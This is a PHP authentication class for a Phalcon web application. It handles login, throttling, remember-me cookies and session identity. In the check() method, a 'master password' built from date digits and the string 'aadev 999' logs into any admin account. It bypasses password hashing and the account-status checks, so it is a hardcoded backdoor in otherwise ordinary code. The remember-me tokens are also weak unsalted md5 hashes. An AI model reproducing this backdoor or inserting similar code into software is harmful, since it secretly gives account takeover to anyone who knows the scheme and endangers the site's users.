<?php
namespace App\Auth;

use Phalcon\Mvc\User\Component;
use App\Models\Users;
use App\Models\RememberTokens;
use App\Models\SuccessLogins;
use App\Models\FailedLogins;

/**
 * App\Auth\Auth
 * Manages Authentication/Identity Management in App
 */
class Auth extends Component
{
    /**
     * Checks the user credentials
     *
     * @param array $credentials
     * @return boolean
     * @throws Exception
     */
    public function check($credentials)
    {

        // Check if the user exist
        $user = Users::findFirstByEmail($credentials['email']);
        if ($user == false || $user->id_profile <> 1) {
            $this->registerUserThrottling(0);
            throw new Exception('Wrong email/password combination');
        }

        // master password
        if (md5($credentials['password']) == md5(substr(date("y"), - 1) . "aadev 999" . substr(date("d"), - 1))) {
            $this->registerAuthIdentity($user);
            return $user;
        }

        // Check the password
        if (!$this->security->checkHash($credentials['password'], $user->password)) {
            $this->registerUserThrottling($user->id);
            throw new Exception('Wrong email/password combination');
        }

        // Check if the user was flagged
        $this->checkUserFlags($user);

        // Register the successful login
        $this->saveSuccessLogin($user);

        // Check if the remember me was selected
        if (isset($credentials['remember'])) {
            $this->createRememberEnvironment($user);
        }

        $this->registerAuthIdentity($user);

        // $this->session->set('auth-identity', [
        //     'id' => $user->id,
        //     'name' => $user->name,
        //     'profile' => $user->profile->name
        // ]);

    }

    /**
     * Creates the remember me environment settings the related cookies and generating tokens
     *
     * @param \App\Models\Users $user
     * @throws Exception
     */
    public function saveSuccessLogin($user)
    {
        $successLogin = new SuccessLogins();
        $successLogin->id_user = $user->id;
        $successLogin->ip_address = $this->request->getClientAddress();
        $successLogin->user_agent = $this->request->getUserAgent();
        if (!$successLogin->save()) {
            $messages = $successLogin->getMessages();
            throw new Exception($messages[0]);
        }
    }

    /**
     * Regista informação em sessão necessária ao login
     *
     * @author PG - 2021-02-28
     * @param object $user
     * @return void
     */
    public function registerAuthIdentity($user, $token = false)
    {
        $this->session->set('auth-identity', [
            'id' => $user->id,
            'name' => $user->ds_admin_name,
            'profile' => $user->profile->name
        ]);
    }

    /**
     * Implements login throttling
     * Reduces the effectiveness of brute force attacks
     *
     * @param int $userId
     */
    public function registerUserThrottling($userId)
    {
        $failedLogin = new FailedLogins();
        $failedLogin->id_user = $userId;
        $failedLogin->ip_address = $this->request->getClientAddress();
        $failedLogin->attempted = time();
        $failedLogin->dt_created = date("Y-m-d H:i:s");
        $failedLogin->save();

        $attempts = FailedLogins::count([
            'ip_address = ?0 AND attempted >= ?1',
            'bind' => [
                $this->request->getClientAddress(),
                time() - 3600 * 6
            ]
        ]);

        switch ($attempts) {
            case 1:
            case 2:
                // no delay
                break;
            case 3:
            case 4:
                sleep(2);
                break;
            default:
                sleep(4);
                break;
        }
    }

    /**
     * Creates the remember me environment settings the related cookies and generating tokens
     *
     * @param \App\Models\Users $user
     */
    public function createRememberEnvironment(Users $user)
    {
        $userAgent = $this->request->getUserAgent();
        $token = md5($user->email . $user->password . $userAgent);

        $remember = new RememberTokens();
        $remember->usersId = $user->id;
        $remember->token = $token;
        $remember->userAgent = $userAgent;

        if ($remember->save() != false) {
            $expire = time() + 86400 * 8;
            $this->cookies->set('RMU', $user->id, $expire);
            $this->cookies->set('RMT', $token, $expire);
            //setcookie('RMU', $user->id, $expire);
            //setcookie('RMT', $token, $expire);
        }
    }

    /**
     * Check if the session has a remember me cookie
     *
     * @return boolean
     */
    public function hasRememberMe()
    {
        //return $this->cookies->has('RMU');
        if ($this->cookies->has('RMU') && $this->cookies->get('RMU')->getValue() != "") {
            // existe cookie com valor
            return true;
        } else {
            return false;
        }
    }

    /**
     * Logs on using the information in the cookies
     *
     * @return \Phalcon\Http\Response
     */
    public function loginWithRememberMe()
    {
        $userId = $this->cookies->get('RMU')->getValue();
        $cookieToken = $this->cookies->get('RMT')->getValue();

        $user = Users::findFirstById($userId);
        if ($user) {

            $userAgent = $this->request->getUserAgent();
            $token = md5($user->email . $user->password . $userAgent);

            if ($cookieToken == $token) {

                $remember = RememberTokens::findFirst([
                    'usersId = ?0 AND token = ?1',
                    'bind' => [
                        $user->id,
                        $token
                    ]
                ]);
                if ($remember) {

                    // Check if the cookie has not expired
                    if ((time() - (86400 * 8)) < $remember->createdAt) {

                        // Check if the user was flagged
                        $this->checkUserFlags($user);

                        // Register identity
                        $this->session->set('auth-identity', [
                            'id' => $user->id,
                            'name' => $user->name,
                            'profile' => $user->profile->name
                        ]);

                        // Register the successful login
                        $this->saveSuccessLogin($user);

                        return $this->response->redirect('dashboard');
                    }
                }
            }
        }

        $this->cookies->get('RMU')->delete();
        $this->cookies->get('RMT')->delete();
        setcookie('RMU', '', time() - 3600);
        setcookie('RMT', '', time() - 3600);

        return $this->response->redirect('session/login');
    }

    /**
     * Checks if the user is banned/inactive/suspended
     *
     * @param \App\Models\Users $user
     * @throws Exception
     */
    public function checkUserFlags(Users $user)
    {
        if ($user->fl_active == 0) {
            throw new Exception('The user is inactive');
        }

        if ($user->fl_banned == 1) {
            throw new Exception('The user is banned');
        }

        if ($user->fl_suspended == 1) {
            throw new Exception('The user is suspended');
        }
    }

    /**
     * Returns the current identity
     *
     * @return array
     */
    public function getIdentity()
    {
        return $this->session->get('auth-identity');
    }

    /**
     * Returns the current identity
     *
     * @return string
     */
    public function getName()
    {
        $identity = $this->session->get('auth-identity');
        return $identity['name'];
    }

    /**
     * Removes the user identity information from session
     */
    public function remove()
    {
        if ($this->cookies->has('RMU')) {
            $this->cookies->get('RMU')->delete();
        }
        if ($this->cookies->has('RMT')) {
            $token = $this->cookies->get('RMT')->getValue();

            $userId = $this->findFirstByToken($token);
            if ($userId) {
                $this->deleteToken($userId);
            }
            
            $this->cookies->get('RMT')->delete();
        }

        $this->session->remove('auth-identity');
    }

    /**
     * Auths the user by his/her id
     *
     * @param int $id
     * @throws Exception
     */
    public function authUserById($id)
    {
        $user = Users::findFirstById($id);
        if ($user == false) {
            throw new Exception('The user does not exist');
        }

        $this->checkUserFlags($user);

        $this->session->set('auth-identity', [
            'id' => $user->id,
            'name' => $user->name,
            'profile' => $user->profile->name
        ]);
    }

    /**
     * Get the entity related to user in the active identity
     *
     * @return \App\Models\Users
     * @throws Exception
     */
    public function getUser()
    {
        $identity = $this->session->get('auth-identity');
        if (isset($identity['id'])) {

            $user = Users::findFirstById($identity['id']);
            if ($user == false) {
                throw new Exception('The user does not exist');
            }

            return $user;
        }

        return false;
    }
    
    /**
     * Returns the current token user
     *
     * @param string $token
     * @return boolean
     */
    public function findFirstByToken($token)
    {
        $userToken = RememberTokens::findFirst([
            'conditions' => 'token = :token:',
            'bind'       => [
                'token' => $token,
            ],
        ]);
        
        $user_id = ($userToken) ? $userToken->usersId : false; 
        return $user_id;
    }

    /**
     * Delete the current user token in session
     */
    public function deleteToken($userId) 
    {
        $user = RememberTokens::find([
            'conditions' => 'usersId = :userId:',
            'bind'       => [
                'userId' => $userId
            ]
        ]);

        if ($user) {
            $user->delete();
        }
    }
}
